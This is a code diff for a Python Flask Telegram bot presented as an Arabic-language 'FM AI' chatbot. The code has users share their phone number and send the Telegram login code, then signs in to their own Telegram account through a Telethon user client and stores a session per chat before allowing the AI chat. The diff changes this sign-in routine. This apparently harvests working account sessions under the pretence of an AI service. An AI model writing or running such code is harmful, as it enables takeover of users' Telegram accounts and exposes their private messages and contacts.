@@ -5,6 +5,11 @@ import requests
 import threading
 from flask import Flask, request
 from telethon import TelegramClient
+from telethon.errors import (
+    SessionPasswordNeededError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError
+)
 
 app = Flask(__name__)
 
@@ -18,7 +23,6 @@ AI_SERVER = "https://kruri.qzz.io/chat/send"
 
 users = {}
 
-# ✅ Event loop رئيسي موحد للتطبيق كله
 main_loop = asyncio.new_event_loop()
 
 def send_message(chat_id, text, reply_markup=None):
@@ -57,13 +61,6 @@ def get_ai_reply(user_message):
     except:
         return "خطأ في الاتصال بالذكاء الاصطناعي"
 
-# ✅ تشغيل async على الـ event loop الموحد
-def run_async(func, *args):
-    """يشغل دالة async على الـ main loop"""
-    future = asyncio.run_coroutine_threadsafe(func(*args), main_loop)
-    return future.result(timeout=30)
-
-# ✅ إرسال رمز التحقق
 async def send_telegram_code(chat_id, phone):
     try:
         session_name = f"session_{chat_id}"
@@ -95,45 +92,45 @@ async def send_telegram_code(chat_id, phone):
     except Exception as e:
         send_message(chat_id, f"❌ فشل إرسال الرمز: {str(e)}")
 
-# ✅ التحقق من رمز الدخول
 async def verify_telegram_code(chat_id, code):
     user = users.get(chat_id)
     if not user or not user.get("client"):
         send_message(chat_id, "❌ انتهت الجلسة، ابدأ من جديد /start")
         return
     
+    client = user["client"]
+    
     try:
-        client = user["client"]
         await client.sign_in(
             phone=user["phone"],
             code=code,
             phone_code_hash=user["phone_code_hash"]
         )
         
-        user_info = await client.get_me()
+        me = await client.get_me()
         user["verified"] = True
         user["user_info"] = {
-            "first_name": user_info.first_name,
-            "username": user_info.username
+            "first_name": me.first_name or "مستخدم",
+            "username": me.username or ""
         }
         
         send_message(
             chat_id,
             f"✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
-            f"🎉 أهلاً بك {user_info.first_name} في بوت FM AI!\n"
+            f"🎉 أهلاً بك {me.first_name} في بوت FM AI!\n"
             f"اختر من الأزرار أدناه للبدء 👇",
             get_main_keyboard()
         )
+        
     except Exception as e:
         user["attempts"] = user.get("attempts", 0) + 1
         if user["attempts"] >= 3:
+            await client.disconnect()
             users[chat_id] = {"verified": False}
-            send_message(chat_id, "❌ <b>تم تجاوز عدد المحاولات.</b> ابدأ من جديد /start")
+            send_message(chat_id, "❌ <b>تم تجاوز عدد المحاولات.</b>\nالرجاء /start لإعادة المحاولة")
         else:
-            remaining = 3 - user["attempts"]
-            send_message(chat_id, f"❌ <b>الرمز غير صحيح!</b>\nالمحاولات المتبقية: {remaining}")
+            send_message(chat_id, f"❌ <b>فشل تسجيل الدخول.</b>\nالمحاولات المتبقية: {3 - user['attempts']}")
 
-# ✅ تشغيل الـ main loop في الخلفية
 def start_main_loop():
     asyncio.set_event_loop(main_loop)
     main_loop.run_forever()
@@ -149,7 +146,6 @@ def webhook():
     chat_id = data["message"]["chat"]["id"]
     user = users.get(chat_id, {"verified": False})
     
-    # ✅ استقبال رقم الهاتف
     if "contact" in data["message"]:
         phone = data["message"]["contact"]["phone_number"]
         send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق...</b>")
@@ -158,7 +154,6 @@ def webhook():
     
     text = data["message"].get("text", "").strip()
     
-    # ✅ مستخدم غير موثق
     if not user.get("verified"):
         if text == "/start" or text == "🔄 إعادة تشغيل":
             users[chat_id] = {"verified": False}
@@ -176,7 +171,6 @@ def webhook():
         
         return "OK", 200
     
-    # ✅ مستخدم موثق
     requests.post(f"{BASE_URL}/sendChatAction", json={"chat_id": chat_id, "action": "typing"})
     
     if text == "/start" or text == "🔄 إعادة تشغيل":
@@ -197,7 +191,7 @@ def webhook():
 
 @app.route("/")
 def home():
-    return "FM AI Bot - Event Loop Unified", 200
+    return "FM AI Bot", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
